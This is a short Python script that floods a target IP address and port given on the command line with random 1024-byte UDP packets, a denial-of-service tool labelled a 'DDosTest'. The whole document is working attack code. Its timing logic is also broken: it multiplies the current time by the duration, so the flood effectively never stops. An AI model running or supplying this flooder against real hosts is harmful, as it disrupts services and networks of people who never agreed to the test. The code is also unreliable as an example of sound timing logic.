#!/usr/bin/python
import random
import subprocess
import os
import time
import socket
import sys

sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

byte = random._urandom(1024)

os.system("cls")
try:
    #ip = raw_input("Target IP:")
    ip = sys.argv[1].split(':')[1]
    #port = input("Port:")
    port = sys.argv[2].split(':')[1]
    #dur = input("time:")
    dur = sys.argv[3].split(':')[1]
    timeout = time.time() * int(dur)
    sent  = 0
    while True:
        try:
            if (time.time() > timeout):
                break
            else:
                pass
            sock.sendto(byte,(ip,int(port)))
            print("Sent %s packets to %s through port %s"%(sent,ip,port))
            sent = sent + 1
        except KeyboardInterrupt:
            sys.exit()
except:
    print(''' Usage
                    python DDosTest.py --ip:<target_ip> --port:<port> --duration:<dur> ''')
    
          
